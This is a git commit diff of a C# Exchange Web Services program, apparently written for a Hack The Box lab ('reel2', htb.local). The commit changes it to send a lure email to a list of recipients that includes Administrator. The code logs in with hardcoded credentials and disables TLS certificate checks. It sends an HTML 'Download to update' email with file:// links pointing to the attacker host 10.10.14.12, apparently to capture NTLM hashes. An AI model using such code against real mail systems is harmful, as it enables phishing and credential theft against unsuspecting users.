f8471f8cba079953ca4fc3d0fe62abf6dcd22aba
Tuyen Dang <tuyendq@gmail.com>
2020-11-07 09:46:24 +0700

    send to a list/array of recipients

--- HelloWorld/Program.cs
+++ HelloWorld/Program.cs
@@ -1,7 +1,17 @@
-﻿// Using VS Code
-// Run below command to install package: Microsoft.Exchange.WebServices
-// dotnet add package Microsoft.Exchange.WebServices --version 2.2.0
-// dotnet run
+﻿/// <summary>
+/// Source: https://docs.microsoft.com/en-us/previous-versions/office/developer/exchange-server-2010/jj220499%28v%3dexchg.80%29
+/// Using VS Code
+/// <code>
+/// dotnet new console -o HelloWorld
+/// cd HellowWorld
+/// dotnet add package Microsoft.Exchange.WebServices --version 2.2.0
+/// dotnet run
+/// </code>
+/// On Kali Linux, install gss-ntlmssp
+/// <code>
+/// apt install gss-ntlmssp
+/// </code>
+/// </summary>
 
 using System;
 using System.Net;
@@ -9,46 +19,58 @@ using Microsoft.Exchange.WebServices.Data;
 
 namespace HelloWorld
 {
+    /// <summary>
+    /// Send email using EWS
+    /// </summary>
     class Program
     {
-    static void Main(string[] args)
-    {
-    //   ExchangeService service = new ExchangeService(ExchangeVersion.Exchange2007_SP1);
-      ExchangeService service = new ExchangeService(ExchangeVersion.Exchange2010);
-    //   service.Credentials = new WebCredentials("user1@contoso.com", "password");
-    //   service.Credentials = new WebCredentials("sven@htb.local", "Summer2020");
-      service.Credentials = new WebCredentials("s.svensson", "Summer2020", "htb");
-      service.TraceEnabled = true;
-      service.TraceFlags = TraceFlags.All;
+        static void Main(string[] args)
+        {
+            //   ExchangeService service = new ExchangeService(ExchangeVersion.Exchange2007_SP1);
+            ExchangeService service = new ExchangeService(ExchangeVersion.Exchange2010);
+            //   service.Credentials = new WebCredentials("user1@contoso.com", "password");
+            //   service.Credentials = new WebCredentials("sven@htb.local", "Summer2020");
+            service.Credentials = new WebCredentials("s.svensson", "Summer2020", "htb");
+            service.TraceEnabled = true;
+            service.TraceFlags = TraceFlags.All;
 
-        // BypassSSLCert
-        ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
+            // BypassSSLCert
+            ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
 
-    //   service.AutodiscoverUrl("sven@htb.local", RedirectionUrlValidationCallback);
-      service.Url = new Uri("https://10.10.10.210/EWS/Exchange.asmx");
-      EmailMessage email = new EmailMessage(service);
-        email.ToRecipients.Add("alex@htb.local");
+            //   service.AutodiscoverUrl("sven@htb.local", RedirectionUrlValidationCallback);
+            service.Url = new Uri("https://10.10.10.210/EWS/Exchange.asmx");
+            EmailMessage email = new EmailMessage(service);
+            // Manually add each email address to recipient
+            // email.ToRecipients.Add("alex@htb.local");
+            // email.ToRecipients.Add("Administrator@htb.local");    
+            // Add email address from an array of recipients       
+            string[] Recipients = { "alex", "Administrator", "jea_test_account" };
+            foreach (string rcpt in Recipients)
+            {
+                email.ToRecipients.Add(rcpt + "@htb.local");
+            }
 
-      email.Subject = "Hello from sven";
-    //   email.Body = new MessageBody("This is the first email I've sent by using the EWS Managed API");
-      email.Body = new MessageBody("<html><h1>Download to update</h1><img src='file://10.10.14.12/image.jpg'></html>");
-    
-      // email.Send();
-      email.SendAndSaveCopy();
-    }
-    private static bool RedirectionUrlValidationCallback(string redirectionUrl)
-    {
-      // The default for the validation callback is to reject the URL.
-      bool result = false;
-      Uri redirectionUri = new Uri(redirectionUrl);
-      // Validate the contents of the redirection URL. In this simple validation
-      // callback, the redirection URL is considered valid if it is using HTTPS
-      // to encrypt the authentication credentials. 
-      if (redirectionUri.Scheme == "https")
-      {
-        result = true;
-      }
-      return result;
-    }
+            email.Subject = "Hello from sven";
+            //   email.Body = new MessageBody("This is the first email I've sent by using the EWS Managed API");
+            // email.Body = new MessageBody("<html><h1>Download to update</h1><img src=\"file://10.10.14.12/image.jpg\"><p><a href='file://10.10.14.12/download.jpg'>reel2</a></p></html>");
+            email.Body = new MessageBody("<html><h1>Download to update</h1><img src=\"testimg\"><p><a href='file://10.10.14.12/download.jpg'>reel2</a></p></html>");
+
+            // email.Send();
+            email.SendAndSaveCopy();
+        }
+        private static bool RedirectionUrlValidationCallback(string redirectionUrl)
+        {
+            // The default for the validation callback is to reject the URL.
+            bool result = false;
+            Uri redirectionUri = new Uri(redirectionUrl);
+            // Validate the contents of the redirection URL. In this simple validation
+            // callback, the redirection URL is considered valid if it is using HTTPS
+            // to encrypt the authentication credentials. 
+            if (redirectionUri.Scheme == "https")
+            {
+                result = true;
+            }
+            return result;
+        }
     }
 }
